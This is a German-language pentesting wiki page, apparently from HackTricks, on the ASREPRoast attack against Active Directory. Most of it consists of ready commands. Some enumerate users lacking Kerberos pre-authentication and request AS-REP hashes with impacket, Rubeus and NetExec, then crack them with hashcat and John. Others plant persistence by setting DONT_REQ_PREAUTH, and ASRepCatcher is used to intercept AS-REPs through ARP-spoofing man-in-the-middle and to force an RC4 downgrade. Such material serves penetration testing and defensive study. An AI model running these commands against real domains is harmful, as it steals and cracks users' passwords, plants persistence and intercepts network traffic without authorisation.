# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast ist ein Sicherheitsangriff, der Benutzer ausnutzt, bei denen das Attribut **Kerberos pre-authentication required** fehlt. Im Wesentlichen ermöglicht diese Schwachstelle Angreifern, beim Domain Controller (DC) die Authentifizierung eines Benutzers anzufordern, ohne das Passwort des Benutzers zu benötigen. Der DC antwortet anschließend mit einer Nachricht, die mit dem aus dem Passwort des Benutzers abgeleiteten Schlüssel verschlüsselt ist. Angreifer können versuchen, diese Nachricht offline zu cracken, um das Passwort des Benutzers herauszufinden.

Die wichtigsten Voraussetzungen für diesen Angriff sind:

- **Fehlende Kerberos pre-authentication**: Bei den Zielbenutzern darf dieses Sicherheitsfeature nicht aktiviert sein.
- **Verbindung zum Domain Controller (DC)**: Angreifer benötigen Zugriff auf den DC, um Anfragen zu senden und verschlüsselte Nachrichten zu empfangen.
- **Optionales Domain-Konto**: Ein Domain-Konto ermöglicht es Angreifern, gefährdete Benutzer mithilfe von LDAP-Abfragen effizienter zu identifizieren. Ohne ein solches Konto müssen Angreifer Benutzernamen erraten.

#### Aufzählung gefährdeter Benutzer (Domain-Credentials erforderlich)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP-Nachricht
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus fordert standardmäßig **RC4** an, daher zeigt die Ereignis-ID **4768** normalerweise **preauth type 0** und **ticket encryption type 0x17**. Wenn du **`/aes`** hinzufügst (oder RC4 für das Ziel deaktiviert ist), werden stattdessen **AES etypes** erwartet.<sup>[[2]](#references)</sup>

#### Schnelle One-Liner (Linux)

- Zuerst potenzielle Ziele auflisten (z. B. aus geleakten Build-Pfaden) mit Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Eine vollständige Username-Liste ohne gültige Credentials mit NetExec roasten: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Wenn du über Credentials verfügst, kann NetExec LDAP abfragen und für dich jedes roastbare Konto anfordern: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Wenn die Ausgabe mit **`$krb5asrep$23$`** beginnt, kann sie mit Hashcat **`-m 18200`** geknackt werden. Wenn sie mit **`$krb5asrep$17$`** oder **`$krb5asrep$18$`** beginnt, sollte bevorzugt John mit **`--format=krb5asrep`** verwendet werden.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Gehe nicht davon aus, dass jeder AS-REP roast RC4 verwendet. Moderne Tools können abhängig vom angeforderten bzw. ausgehandelten Enctype **RC4** (`$krb5asrep$23$`) oder **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) zurückgeben. **`hashcat -m 18200`** ist für **etype 23** vorgesehen, während **John** `krb5asrep` direkt für **17/18/23** verarbeitet.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistenz

Erzwinge, dass **preauth** für einen Benutzer, für den du **GenericAll**-Berechtigungen (oder Berechtigungen zum Schreiben von Eigenschaften) besitzt, nicht erforderlich ist:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast ohne Zugangsdaten

Ein Angreifer kann eine Man-in-the-Middle-Position nutzen, um AS-REP-Pakete abzufangen, während sie das Netzwerk durchlaufen, ohne darauf angewiesen zu sein, dass die Kerberos-Pre-Authentifizierung deaktiviert ist. Es funktioniert daher für alle Benutzer im VLAN.\
Wenn du den zugehörigen Trick ohne Zugangsdaten sehen möchtest, der von einem Principal ohne Pre-Auth ein **Service-Ticket** statt eines **TGT** zurückgibt, siehe [Kerberoast](kerberoast.md).

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ermöglicht dies. Der Modus `relay` ist offensiv besonders interessant, da er **RC4** erzwingen kann, wenn der Client weiterhin **etype 23** ankündigt; `listen` bleibt passiv und fängt lediglich das ab, was der Client/DC ausgehandelt hat.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referenzen

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
